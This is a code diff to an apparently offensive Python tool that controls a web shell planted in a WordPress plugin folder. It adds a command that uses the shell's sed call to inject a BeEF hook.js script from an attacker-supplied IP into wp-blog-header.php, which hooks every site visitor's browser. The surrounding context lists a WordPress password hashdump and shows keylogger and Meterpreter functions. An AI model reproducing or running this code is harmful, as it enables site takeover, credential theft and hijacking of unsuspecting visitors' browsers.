@@ -79,6 +79,7 @@ def commandloop(host,uploaddir):
                 Command                   Description
                 -------                   -----------
                 ?                         Help menu
+                beef                      Injects a BeEF hook into website
                 exit                      Terminate the session
                 hashdump                  Dumps all WordPress password hashes
                 help                      Help menu
@@ -102,6 +103,8 @@ def commandloop(host,uploaddir):
             keylog(host, uploaddir)
         if cmd == "meterpreter":
             meterpreter(host, uploaddir)
+        if cmd == "beef":
+            beefhook(host, uploaddir)
         else:
             print "Sent command: " + cmd
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
@@ -311,6 +314,14 @@ $conn->close();
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
     params = [
     ('cmd', 'php hashdump.php'.encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    print sendcommand.text
+
+
+def beefhook(host,uploaddir):
+    ip = raw_input('IP Address: ')
+    params = [
+        ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
     print sendcommand.text
 
